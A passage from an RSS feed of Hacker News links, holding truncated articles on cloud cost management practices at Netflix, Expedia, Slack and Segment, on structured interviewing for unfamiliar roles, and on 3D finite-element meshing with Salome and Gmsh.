<p><em>A picture of Netflix’s dashboard that shows cost by organizational hierarchy. This kind of reporting helps give every team ownership of their cost.</em></p>


<p><strong><img src="https://lh4.googleusercontent.com/NFqGI195_7US8FTRoEbUYloGvtOaXxwOrIYgGBOPT--iAe5Et9VAI2mOJMW8_s_YI9M_eWkVEzkU_FAQTUF37FX5VmymWHs-3I5FhOGnLe8qlSdQ1BxRDZl2M_yaZAHnoyty_l3J" width="247" height="98" alt="Expedia Logo"></strong></p>
<p><strong><span>How We Know</span></strong></p>
<p>Expedia spoke at re:Invent in 2017. This is a few years old at this point, but Expedia was quite sophisticated, even back then. You can watch it <a href="https://www.youtube.com/watch?v=iOWNZqG0RN4&amp;feature=emb_logo">here</a>.</p>
<p><strong><span>How They Do It</span></strong></p>
<p>At the time of this presentation, they were just embarking on building their own custom tool to get the metrics they needed, so this is a bit light on the details of what they eventually built.</p>
<p>However, they did share that their cost optimization practices are:</p>
<ul>
<li>Automation to tag all resources</li>
<li>Visualization and monitoring tools</li>
<li>Measure, measure, measure</li>
<li>Leveraged RI pricing</li>
<li>Decentralized forecasting and planning process</li>
<li>Encouraged teams to share optimization best practices</li>
</ul>
<p><strong><span>Cost Culture</span></strong></p>
<p>In 2017, Expedia wasn’t just focusing on cost optimization. They were building “cost transparency” for their engineering teams and decentralizing responsibility for cost management. One of the major changes they made was involving engineering teams in the forecasting and budgeting.</p>
<p><img src="https://www.cloudzero.com/hs-fs/hubfs/blog/cloud-cost-management-tools-03.png?width=800&amp;name=cloud-cost-management-tools-03.png" alt="Expedia's Cloud Cost Management Best Practices" width="800" srcset="https://www.cloudzero.com/hs-fs/hubfs/blog/cloud-cost-management-tools-03.png?width=400&amp;name=cloud-cost-management-tools-03.png 400w, https://www.cloudzero.com/hs-fs/hubfs/blog/cloud-cost-management-tools-03.png?width=800&amp;name=cloud-cost-management-tools-03.png 800w, https://www.cloudzero.com/hs-fs/hubfs/blog/cloud-cost-management-tools-03.png?width=1200&amp;name=cloud-cost-management-tools-03.png 1200w, https://www.cloudzero.com/hs-fs/hubfs/blog/cloud-cost-management-tools-03.png?width=1600&amp;name=cloud-cost-management-tools-03.png 1600w, https://www.cloudzero.com/hs-fs/hubfs/blog/cloud-cost-management-tools-03.png?width=2000&amp;name=cloud-cost-management-tools-03.png 2000w, https://www.cloudzero.com/hs-fs/hubfs/blog/cloud-cost-management-tools-03.png?width=2400&amp;name=cloud-cost-management-tools-03.png 2400w" sizes="(max-width: 800px) 100vw, 800px"></p>
<p><em>A slide from Expedia's Re:Invent talk in 2017.&nbsp;</em></p>


<p><img src="https://lh5.googleusercontent.com/NI7jOF1kxFDxmn_q3P-_70Gw251xlwBtnJXXk6YOtEOFy1-qkpIOX9pRCJN_tE_vdT7N1JQMS6S57rEi33S_KdoDSYmJgKrgFajCmTIdD3hLzAIr6C99i-S9YfyOWy8N7Yf905ue" width="228" height="58" alt="Slack Logo"></p>
<p><strong><span>How We Know</span></strong></p>
<p>Slack published a <a href="https://angel.co/company/slack/jobs/1025669-software-engineer-cloud-economics">job posting</a> for a cloud economics engineer. While it is not quite as extensive as the blogs and re:Invent talks, it still gives us a glimpse into what Slack does for cost management. We suspect this posting won’t last forever, so we pasted it into a document <a href="https://docs.google.com/document/d/1ZC9e3dhGrAcKXdQR5wTz8Dpg9ZGc-1-PimGsn-K-FZY/edit?usp=sharing">here</a>.</p>
<p><strong><span>How They Do It</span></strong></p>
<ul>
<li>Slack has a cloud economics engineering team composed of cloud engineers, financial analysts, and AWS subject matter experts working to make Slack more performant, available, and cost-efficient each day.</li>
<li>They are developing a new platform to provide engineering teams visibility into their cloud spend and efficiency.</li>
<li>They are building a home-grown chargeback system to ensure the correct service owners know the cost they place onto other systems.</li>
</ul>
<p>They monitor cloud spend, track and alert on changes over time.</p>
<p><strong><span>Cost Culture</span></strong></p>
<p>This about sums it up: “We advise teams within Slack on how to maximize their value from the cloud and ultimately aim to build a culture where all our engineers are cost-conscious and building a business scalable for the long term. We get excited about making Slack cost-efficient whilst ensuring we use the right technology stack.”</p>


<p><strong><img src="https://lh5.googleusercontent.com/k2T9Lahj1hs0np6zRfTBUhtTEKY1HNxItg6ItI5O0wxAWg0RrlDD5p68IiYsTFf7opSlcgwo7_9JxF2AE2uJDpNHCzUxwcrxaHJxEXmpG5kbq7olC4zeMWNxHzHfCy2sLHgDZNHV" width="257" height="52" alt="Segment Logo"></strong></p>
<p><span><strong>How We Know</strong></span></p>
<p>Segment has written two blogs about how they do cost management.</p>
<p>You can check them out here:</p>
<ul>
<li><a href="https://segment.com/blog/the-million-dollar-eng-problem/">The Million Dollar Engineering Problem </a> (2017)</li>
<li><a href="https://segment.com/blog/the-10m-engineering-problem/">The Ten Million Dollar Engineering Problem </a> (2019)</li>
</ul>
<p>Both blogs focus on how they cut down existing costs to improve margins (which we’re guessing helped that really, really big <a href="https://techcrunch.com/2020/10/12/twilios-3-2b-segment-acquisition-about-helping-developers-build-data-fueled-apps/">acquisition number</a>). We’re going to focus more on how they do ongoing monitoring and proactively reduce spend, which is covered in the 2019 blog.</p>
<p><span><strong>How They Do It</strong></span></p>
<ul>
<li>Today, they monitor their spend on an ongoing basis, so they won’t have to worry about their margins creeping up on them anymore.</li>
<li>To get the ongoing visibility they need, Segment built a set of repeatable pricing drivers, calculated daily. The entire cost pipeline feeds into their Redshift instance, and they get daily monitoring on their “cost drivers”, visualized in Tableau. They have now built custom alerting to detect spikes and send teams an email.</li>
</ul>
<p><span><strong>Cost Culture</strong></span></p>
<p>Segment lists 36 people who are part of their “gross margin team.” It’s clear they’ve helped their engineering team understand the value of building cost-effective products.</p>

<h2>Part 3: Intelligence vs. Management</h2>
<p>Each company uses slightly different terminology. Expedia and Netflix both say they’ve built “cost transparency,” for example. But what is more striking — are the similarities.</p>
<p>Each team has built essentially the same solution to transform cloud cost from centralized and reactive to autonomous and proactive — while integrating cost as a key metric in their development process. They have also found metrics that align to their business, so everyone from their CEO down to an individual engineer can make better decisions based on cost.</p>
<p>At CloudZero, we call this <a href="https://www.cloudzero.com/cloud-cost-intelligence">cloud cost intelligence</a>.</p>
<p>Cloud cost management is about reporting retroactively on how much you have spent. Cloud cost intelligence is about leveraging cost data to outperform your competition — or know exactly what levers you can pull when times get tough.</p>
<p>These companies have wielded this power to their advantage to generate resilient growth — and you can too.</p>

<h2>Add Cloud Cost Intelligence the Easy Way</h2>
<p>Here’s the …</p></span></p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.cloudzero.com/blog/cloud-cost-management-tools">https://www.cloudzero.com/blog/cloud-cost-management-tools</a></em></p>]]>
            </description>
            <link>https://www.cloudzero.com/blog/cloud-cost-management-tools</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061054</guid>
            <pubDate>Wed, 11 Nov 2020 18:18:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Hacking Structured Interviewing: Hiring for Jobs You Don't Understand]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25061052">thread link</a>) | @nickpresta
<br/>
November 11, 2020 | https://mikedebo.com/work/2020/11/06/hacking-structured-interviewing-for-jobs-you-dont-understand/ | <a href="https://web.archive.org/web/*/https://mikedebo.com/work/2020/11/06/hacking-structured-interviewing-for-jobs-you-dont-understand/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
    <p>Have you ever hired for a job you didn’t understand? It’s scary. If you don’t know how to do the job yourself, how can you assess what a strong candidate looks like?</p>

<p>In this post, we’ll see how to modify a well-researched interview methodology to quickly build a process  that helps you hire for the unknown in 4 steps. And, in the spirit of incrementalism, you’ll have something useful after each step.</p>

<!--more-->

<p>(This post was also published as a series of articles on LinkedIn. See part <a href="https://www.linkedin.com/pulse/hacking-structured-interviewing-hiring-jobs-you-dont-part-dibernardo/">one.</a>)</p>

<h2 id="different-people-same-problem">Different People, Same Problem</h2>

<p>A couple of weeks ago, I spoke to two very different people who had the same problem. The first was a senior engineering leader at a ~300 person company who needed to hire a data analytics lead, a role that was very unfamiliar to them. The second was a founder who was hiring their first software engineer.</p>

<p>They were pretty stressed about it. Perhaps you can relate.</p>

<p>In my experience, people tend to approach this problem in one of two ways:</p>
<ol>
  <li>“We don’t know how to hire for this position, and we could spend a lot of time creating an interview process that doesn’t even work. We should hire based on ‘culture fit’, which we can figure out by getting to know them. Sometimes we have to take risks.”</li>
  <li>“We don’t know how to hire for this position, It would be very expensive to hire the wrong person. We should create an exhaustive interview that assesses everything needed in this role, since this is a foundational hire. We don’t want to take too many risks.”</li>
</ol>

<p>These are both natural reactions. Both have clear downsides, and my experience is that both can easily lead to bad hiring decisions. So, perhaps the lesson is that if these are your only options, it’s probably better to take the former!</p>

<p>However, I think we can do better.</p>

<p>With a few hours of work, we can build a process that:</p>
<ul>
  <li>Reduces hiring risk</li>
  <li>Reduces bias and unfairness</li>
  <li>Creates a good experience for both candidate and the interviewers</li>
</ul>

<p>Furthermore, you can have something <em>usable</em>—not great, but usable—in under an hour.</p>

<p>How will we do this?</p>

<p>Starting from scratch would take too long. Luckily, there’s a lot of research-based practice that we can hack to make a good first hire without prohibitive effort.</p>

<p>In this article, we’ll look to and oldie-but-goodie as a guide.</p>

<h2 id="hacking-structured-interviewing">Hacking Structured Interviewing</h2>

<p>Structured interviewing is a hiring methodology that has been heavily researched and practices for decades. Google has summarized the research and their own experiences with it on <a href="https://rework.withgoogle.com/guides/hiring-use-structured-interviewing/steps/introduction/">re:work</a>, which is a super useful resource that I’ve often referred to.</p>

<p>In their introduction to the topic, the writers state:</p>

<blockquote>
  <p>Structured interviewing simply means using the same interviewing methods to
assess candidates applying for the same job. Research shows that structured
interviews can be predictive of candidate performance, even for jobs that are
themselves unstructured.</p>
</blockquote>

<p>Sounds great! If we’re hiring this role for the first time, the job is likely to be pretty unstructured.</p>

<p>However, in the very next paragraph, we read:</p>

<blockquote>
  <p>So why don’t more organizations use structured interview questions? Well,
they are hard to develop. You have to write them, test them, and make sure
interviewers stick to them.</p>
</blockquote>

<p>Oof. And here I am assuring you this won’t take long. Maybe it’ll just be easier to go with what you were originally planning. After all, how hard can it be?</p>

<p>Well:</p>

<blockquote>
  <p>Research has also shown that structured interviews aren’t more frequently used because, in general, interviewers everywhere think they’re good at interviewing and don’t need the help. Surely many of us like to think we’re excellent judges of character.</p>
</blockquote>

<blockquote>
  <p>But when it comes to hiring, don’t trust your gut. Research shows that during first encounters we make snap, unconscious judgments heavily influenced by our existing unconscious biases and beliefs. For example, in an interview context, without realizing it, we shift from assessing the complexities of a candidate’s competencies to hunting for evidence that confirms our initial impression. Psychologists call this <em>confirmation bias</em>.</p>
</blockquote>

<p>This cautionary clause helps us define our design problem.</p>

<p>We want to <em>quickly</em> create a hiring process that reduces our confirmation bias, because that will lead to better decisions.</p>

<p>The resources in re:work help with the confirmation bias part, but they don’t show us how to do it quickly. Let’s see how we can hack what they’ve shown us to get some speed out of it.</p>

<h2 id="the-raw-materials">The Raw Materials</h2>

<p>There are a handful of <a href="https://rework.withgoogle.com/guides/hiring-use-structured-interviewing/steps/know-the-components/">key elements</a> to a structured interview:</p>

<ol>
  <li>A small set of <strong>competencies</strong> that we’re looking for from candidates.</li>
  <li>Standard <strong>questions</strong> that test those competencies.</li>
  <li>Comprehensive <strong>feedback</strong> gathered by interviewers asking the questions.</li>
  <li>A <strong>rubric</strong> that helps interviewers consistently deliver their feedback.</li>
</ol>

<p>That seems like a lot to consider. However, this short list helps focus our hacking on techniques that are known to work.</p>

<p>We’re going to transform this list into a 4-step recipe for your own structured interview process. In the spirit of incrementalism, you’ll have something useful after each step.</p>

<p>If you follow the whole thing, it should take about 3-4 hours.</p>

<h2 id="step-1-define-competencies">Step 1: Define Competencies</h2>

<p>Take 15-30 mins. and come up with a list of 3-5 <em>competencies</em> that are important in this role.</p>

<p>It can be tempting to pick more than that, but please start small. If Google can reduce their hiring criteria to <a href="https://rework.withgoogle.com/guides/hiring-use-structured-interviewing/steps/define-hiring-attributes/">4 competencies</a>, I think we can get there too.</p>

<p>Each one should have a short 1-3 word “slug” that captures its spirit, and a sentence or two to describe what it means in more detail.</p>

<p>If you’re not sure how to start, you can hack this boring-but-effective list:</p>

<ol>
  <li><strong>Technically Skilled.</strong> Has the hard skills and knowledge required to do the job well.</li>
  <li><strong>Effective Communicator.</strong> Talks about their work in a way that we understand and trust.</li>
  <li><strong>Has Soft Skills We Value.</strong> There are certain strengths or skills that each company uniquely values, so articulate this here.</li>
</ol>

<p>Each of these higher-level competencies can be broken down into more specific ones, but remember to keep the total to 5 or fewer.</p>

<p>To help with the hacking, let’s explore each of these suggested competencies a bit further.</p>

<h3 id="technical-skills">Technical Skills</h3>

<p>“Wait,” you may be thinking. “The whole reason I’m reading this article is because I don’t know how to do this person’s job. Now you’re telling me to figure out how to assess their technical ability? What gives?!”</p>

<p>I know. It sucks. This will likely be the hardest competency for you to define. If you are hiring for a role that is the first of its kind in your company, you may not be able to describe it any more precisely than I already have, and that’s OK. We’ll talk about some ways to manage this in the next step.</p>

<p>Most people in this position will get help from a teammate or other connection who knows the technicals of the job. This is especially true if you’re hiring a new leader to level-up a more junior team that is already doing the work.</p>

<p>Your role is to keep their ideas <em>focused</em>. This is important, because subject-matter experts can have a hard time keeping this list under control. I’ve seen people struggle to pick fewer than 10 separate technical competencies that are important in their jobs.</p>

<p>You can help by finding ways to:</p>

<ul>
  <li>Coalesce competencies into larger areas of concern, and</li>
  <li>Eliminate things.</li>
</ul>

<p>If this is nerve-wracking, remember that time is always a constraint. More things on the list means longer interviews, and longer interviews mean less time for other important work. We’re not trying to cover every single thing that is important to the job; we’re trying to assess the most critical things with the time that we have.</p>

<h3 id="effective-communicator">Effective Communicator</h3>

<p>You may be unsurprised to find this in the list, but I want to highlight why I think this is especially important for a pioneering role.</p>

<p>If you’re creating a new kind of job in your team—even if it already exists somewhere else at your company— it’s really important that you can trust this person to furnish you with information in a way that helps you make effective decisions.</p>

<p>When we’re hiring for something new, we can get so focused on the person’s ability to do the job that we lose sight of how important it is for everyone to meaningfully understand <em>how the work is going</em>. This is especially important if this person is responsible for building an entirely new competency within the company, because it’s hard for new things to build momentum without understanding and trust.</p>

<p>To summarize: It’s important that this person can do the job. It’s also super important that they can explain it to you and others in a way that’s easy to understand. This understanding creates trust, and trust fuels meaningful results.</p>

<h3 id="has-soft-skills-we-value">Has Soft Skills We Value</h3>

<p>I once spoke to a founder who was looking for people who were “naturally inquisitive.” That sounded off to me, because it requires more than testing for curiosity; it requires us to determine whether that curiosity is <em>intrinsic</em>.</p>

<p>I asked for a concrete example of what “natural inquisitiveness” looked like. They said: “Well, at the lunch table, we’ll often have big debates about political or social issues. These are really fun, because people won’t just state their thoughts: They’ll try to find the logical arguments or fallacies behind the different positions. It’s not just an emotional conversation. We’re always looking to verify the underlying principles.”</p>

<p>From this starting point, we were eventually able to articulate the “soft skill” that they were looking for: A good candidate would <em>effectively apply the scientific method to everyday problems</em>.</p>

<p>This re-framing improves on the original in several ways:</p>

<ul>
  <li>It’s easier to assess than “naturally inquisitive”.</li>
  <li>It has less to do with <em>identity</em> and more to do with <em>ability</em>.</li>
  <li>It connects to a unique part of the company’s history, which was founded by scientists out of a university research project.</li>
</ul>

<p>Because first-time hires tend to be fraught with risk, I find that interviewers naturally want to latch onto something that helps …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://mikedebo.com/work/2020/11/06/hacking-structured-interviewing-for-jobs-you-dont-understand/">https://mikedebo.com/work/2020/11/06/hacking-structured-interviewing-for-jobs-you-dont-understand/</a></em></p>]]>
            </description>
            <link>https://mikedebo.com/work/2020/11/06/hacking-structured-interviewing-for-jobs-you-dont-understand/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061052</guid>
            <pubDate>Wed, 11 Nov 2020 18:18:02 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Overview of 3D meshing methods using open source tools]]>
            </title>
            <description>
<![CDATA[
Score 29 | Comments 4 (<a href="https://news.ycombinator.com/item?id=25060942">thread link</a>) | @alibabaSX
<br/>
November 11, 2020 | https://www.sesamx.io/blog/3d_mesh_with_free_tools/ | <a href="https://web.archive.org/web/*/https://www.sesamx.io/blog/3d_mesh_with_free_tools/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div role="main">
  <div>
    <div>
      <article role="main">
        

<p>The Internet is full of beautiful 3D mesh examples, but it is difficult to get clues
about how they were constructed. In fact, <strong>creating a good 3D mesh can be very
painful without the right tools or training</strong>. Furthermore, most of commercial
pre-processing software have been improving and propose powerful 3D meshing algorithm,
capable of building hybrid or full hexahedron mesh. <strong>The aim of
this article is to give an overview of the constraints involved when building
a 3D mesh for structural finite element, as well as exposing various meshing
methods relying on free and open source tools</strong>.</p>

<h2 id="introduction">Introduction</h2>

<p>Before we start, let’s give some background information about 3D mesh
construction. Usually a 3D mesh can be composed of 4 types of elements:</p>

<ul>
<li><p>tetrahedron (4 corners),</p></li>

<li><p>wedge (6 corners),</p></li>

<li><p>hexahedron (8 corners),</p></li>

<li><p>and rarely pyramids (5 corners).</p></li>
</ul>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/3d_mesh_element_types.png" alt="3D mesh element types"></p>

<p><strong>The goal is to get a mesh with the lowest number of
degrees of freedom (“dofs”), while maintaining a good representative capability</strong>.
We may be
tempted to race for tetrahedrons, which have only 4 nodes (for a linear
element). But reality is more involved: <strong>certain types of elements behave better
than others</strong>. Without entering to much into the details, we can provide some hints
about this:</p>

<ul>
<li><p><strong>4-node tetrahedron (linear element) must be avoided as mush as possible</strong>. It
behaves poorly and a lot of them are needed to get meaningful results. If you
have no other choice, try to convert them to 10-node tetrahedron which is much
better.</p></li>

<li><p>if you want to stay with linear elements, <strong>you must aim towards hexahedron</strong>. Most
finite element software (you can guess that SesamX is part of them) propose an
improved version of the hexahedron element. That makes it a better choice than
the other elements.</p></li>

<li><p><strong>6-node wedge (linear element)</strong> is better than 4-node tetrahedron but worse than
8-node hexahedron. <strong>It is ok to use them, but go for hexahedron wherever possible</strong>.</p></li>

<li><p>I have not tested the pyramid enough to give relevant advice. Nevertheless,
from the fact that this element is seldom used in 3D mesh, this article will not
shed light on it.</p></li>
</ul>

<p>It is easy to build a full tetrahedron mesh using an automatic mesher
(and it is widespread among various software). On the contrary, <strong>full hexahedron or
hybrid automatic meshers are more involved and harder to find</strong> (you can find them
among commercial solutions but almost not among free ones).</p>

<p><strong>However, using only free and open source tools, we are still able to build
quality 3D meshes</strong>.</p>

<p>The remaining of <strong>this article exhibits 4 methods to build 3D meshes using Salome or
Gmsh</strong>. The goal is not to enter into every detail about the options used, but to
give an overview of how 3D meshes can be built. Whatever the tool we use, changing
the element order is usually a trivial task (either linear or quadratic).
Therefore I will not detail it here. Instead, <strong>I will focus on controlling the
element shapes while meshing</strong>.</p>

<p>For each method, I provide a step by step guide with illustrative screenshots. And, when
appropriate, I also provide the final result file that you can edit and modify
on your own.</p>

<h2 id="geometry-used">Geometry used</h2>

<p>I will use the following con rod to showcase how to build each mesh.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/con_rod_geometry.PNG" alt="Con rod geometry"></p>

<p>One important feature to mention here, is that <strong>this con rod geometry is made of
a compound of 3 solids</strong> (this reason will make sense when talking about the hybrid
mesh generation method) corresponding to each color on the image above.</p>

<p>You can find the corresponding step file
<a href="https://www.sesamx.io/blog/files/008_3d_mesh_with_free_tools/con_rod_to_mesh.step">here</a>.</p>

<h2 id="full-tetrahedron-automatic-meshing-method">Full tetrahedron automatic meshing method</h2>

<p>As mentioned before, <strong>it is pretty straightforward to get a full tetrahedron<br>
mesh</strong>. To build this mesh, we use <strong>Salome</strong>.</p>

<p>First, we go to the geometry module and import the step file. The Salome tree
should look like this:</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/salome_import_tree.PNG" alt="Salome import tree"></p>

<p>Then we have to explode the compound geometry into its 3 sub-solids and create a
partition from these solids. <strong>This step is necessary to ensure that Salome will merge
coincident nodes from each solid faces</strong>. The result tree is then:</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/salome_partition_tree.PNG" alt="Salome partition"></p>

<p>Next we go to the mesh module, and create a new mesh on the partition. Under
algorithm we can select “NETGEN 1D-2D-3D” and under hypothesis “NETGEN 3D
Simple Parameters”. Finally we have to input the edge size that our elements should
have.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/tetrahedron_mesh_parameters.png" alt="Salome tetrahedron mesh parameters"></p>

<p>Eventually we have to right click on the mesh and hit “Compute”. The mesh should
look like this:</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/tetrahedron_mesh.PNG" alt="Salome tetrahedron mesh"></p>

<p>As you can see, the mesh is made of tetrahedron but also triangles and edges
elements. To get rid of the 2D and 1D elements, the first step is to
click on the mesh and select “Create Group”. A panel appear and we can create one
group containing all the 2D elements (as shown on the picture below) and
similarly for the 1D elements.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/salome_create_group.png" alt="Salome create group"></p>

<p>Next to delete these elements, we have to right
click on each group and select “Delete Group with Content”. <strong>And we get
the following full tetrahedron mesh</strong>.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/final_tetrahedron_mesh.PNG" alt="Salome final tetrahedron mesh"></p>

<p>Finally, <strong>to check that the mesh does not contain any duplicated nodes</strong> we have to
select the mesh and use “Controls / Node Controls / Double Nodes”.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/full_tet_double_nodes.PNG" alt="Tetrahedron duplicated nodes check"></p>

<p>If you want to manipulate this mesh, you can find the corresponding Salome database
<a href="https://www.sesamx.io/blog/files/008_3d_mesh_with_free_tools/full_tet_con_rod.hdf">here</a>.</p>

<h2 id="full-hexahedron-automatic-meshing-method">Full hexahedron automatic meshing method</h2>

<p>Next come the full hexahedron mesh. To build this mesh, we use <strong>Gmsh</strong>.</p>

<p>First, <strong>it is necessary to create a volume physical group containing the 3
solids of the model. It ensure afterwards that the mesh export will, in fact,
export only the 3D elements.</strong></p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/gmsh_volume_physical_group.PNG" alt="Gmsh volume physical group"></p>

<p>Next we go to “Tools / Options” then “Mesh / General” to select the meshing
parameters. We can
choose whatever makes it for the 2D algorithm, 3D algorithm and 2D recombination
algorithm. These parameters influence how the mesh is built, feel free to change
them to notice the difference in the mesh. As a first guess, we can
stay with “Delaunay” and “Blossom”. However, <strong>make sure to select “All Hexas” as the
“Subdivision algorithm” so that the volumes will be filled with hexahedron only.</strong></p>

<p>Finally under “Min/Max element size” we can fix the element size.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/gmsh_meshing_parameters.PNG" alt="Gmsh meshing parameters"></p>

<p>Eventually, we have to go back to the Gmsh tree and click “3D” under “Mesh” to
build the mesh.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/gmsh_mesh_creation.png" alt="Gmsh mesh creation"></p>

<p>We can check the mesh content under “Tools / Statistics”. As you can see, the mesh
is made of 1D, 2D and 3D-hexahedron elements. <strong>Because we have created a physical
group for the 3 volumes, only the 3D mesh will be exported.</strong></p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/final_hexaedron_mesh.PNG" alt="Gmsh mesh creation"></p>

<p>If you have troubles visualizing the 3D elements, you can adjust the visibility
parameters in the “Mesh” options window under the “Visibility” tab.</p>

<p>Unfortunately, there is a trap here. <strong>The mesh obtained has duplicated nodes</strong>
at the interfaces between the 3 solids. To visualize them, we can export the mesh
as a .med file, import it in Salome, and use the “double nodes” tool mentioned
previously.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/full_hexahedron_duplicated_nodes.PNG" alt="Hexahedron duplicated nodes"></p>

<p>Finally, to solve this issue, we have to use the “Merge Nodes” tool under
“Modification / Transformation”.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/full_hexahedron_remove_duplicated.PNG" alt="Hexahedron remove duplicated nodes"></p>

<h2 id="hybrid-meshing-method">Hybrid meshing method</h2>

<p>Next <strong>I am showcasing how to build an efficient hybrid mesh with Salome.</strong> This
method is my favorite because <strong>it leads to a well structured mesh, which can
capture more efficiently the details of the geometry</strong> (if you have a close look
to the automatic tetrahedron and hexadreon meshes, you can see that the fillet
is not always “well captured” for instance). The drawback of this method is that it does not
lead to a full hexahedron mesh but an hybrid mesh made with a majority of
hexahedrons, and a minority of wedges used to fill gaps.</p>

<p><strong>The 3D mesh will be built first by meshing 2D surfaces and then by extruding
them.</strong> To make this process workable, the geometry has been split into 3 solids
beforehand. Each of these solids can then be meshed as an extrusion of the surface
meshes.</p>

<table>
<thead>
<tr>
<th><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/hybride_mesh_solid_1.PNG" alt="Solid 1"></th>
<th><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/hybride_mesh_solid_2.PNG" alt="Solid 2"></th>
<th><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/hybride_mesh_solid_3.PNG" alt="Solid 3"></th>
</tr>
</thead>

<tbody>
<tr>
<td><center><em>Solid 1</em></center></td>
<td><center><em>Solid 2</em></center></td>
<td><center><em>Solid 3</em></center></td>
</tr>
</tbody>
</table>

<p>As explained for the full-tetrahedron mesh, <strong>we first need to explode the
compound geometry and build a partition.</strong></p>

<p>Then, in order to build the 2D meshes on the surfaces and the 3D extrusion meshes,
we need to extract (using explode) the relevant geometries from this partition:</p>

<ul>
<li>the 3 solids geometries,</li>
<li>the top face of solid 1 (red face on solid 1 image), that will drive the
3D mesh on solid 1,</li>
<li>the “fillet face” of solid 2 and 3 (red face on solid 3 image) that will drive
the 3D mesh on solid 2 and solid 3.</li>
</ul>

<p>The Salome tree should look like this:</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/salome_partition_tree_hybrid.PNG" alt="Salome tree for hybrid mesh"></p>

<p>Next, we go to the mesh module. The meshing process is the following:</p>

<ul>
<li><p>Create a mesh object and assign default 3D mesh parameters to the whole
partition,</p></li>

<li><p>Create 2 sub-meshes for the 2 surfaces to mesh,</p></li>

<li><p>Create 3 sub-meshes for the 3 solids to mesh.</p></li>
</ul>

<p><strong>The default 3D meshing parameters will not be used while computing the mesh,
because the sub-meshes definition will cover the whole partition.</strong> Nevertheless, Salome
still requires these default parameters.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/tetrahedron_mesh_parameters.png" alt="Salome import tree"></p>

<p>To create the faces sub-meshes, we have to right click on the mesh and
select “Create Sub-mesh”. We then need to select one of the faces and choose the
“NETGEN 1D-2D”
algorithm with “NETGEN 2D Simple Parameters”. Then we can input the element size
and <strong>make sure to check “Quad-dominated” (to avoid at most triangles)</strong>.</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/face_submesh_parameters.png" alt="Salome face submesh parameters"></p>

<p>To compute the sub-mesh, we have to right click on it and select “Compute
Sub-mesh”. And we repeat these operations for the second face.</p>

<p><strong>Creating the 3D sub-meshes is similar.</strong> Once we have selected the solid to mesh,
we choose “Extrusion 3D” as the meshing algorithm and no hypothesis needs to be associated.
However, we have to provide the 1D algorithm and hypothesis to define
how the mesh extrusion should behave.</p>

<p>We select “Wire Discretisation” as the 1D algorithm, and the previous local length
used for the 2D sub-meshes as the hypothesis.</p>

<table>
<thead>
<tr>
<th><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/hybrid_3d_submesh_parameters.png" alt="Hybrid 3D submesh parameters"></th>
<th><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/hybrid_1d_submesh_parameters.png" alt="Hybrid 1D submesh parameters"></th>
</tr>
</thead>

<tbody>
<tr>
<td><center><em>3D submesh parameters</em></center></td>
<td><center><em>1D submesh parameters</em></center></td>
</tr>
</tbody>
</table>

<p>We repeat this for the 2 other solids. The mesh tree should look like this:</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/hybrid_mesh_tree.PNG" alt="Salome hybrid mesh tree"></p>

<p><strong>Before computing the mesh, we need to tell Salome in which order the sub-meshes
should be computed.</strong> To avoid meshing conflict while extruding, it is best in
our case, to fully mesh solid 1 before meshing the driving surface of solid 2
and solid 3. We have to right click on the mesh and select “Change sub-mesh Priority”.
The meshing order should be the following:</p>

<p><img src="https://www.sesamx.io/blog/img/008_3d_mesh_with_free_tools/hybrid_mesh_order.PNG" alt="Salome hybrid mesh tree"></p>

<p>After …</p></article></div></div></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.sesamx.io/blog/3d_mesh_with_free_tools/">https://www.sesamx.io/blog/3d_mesh_with_free_tools/</a></em></p>]]>
            </description>
            <link>https://www.sesamx.io/blog/3d_mesh_with_free_tools/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25060942</guid>
            <pubDate>Wed, 11 Nov 2020 18:07:25 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Remote Work: 5 Tips for Finding the Best Remote Jobs]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25060843">thread link</a>) | @martin_crd
<br/>
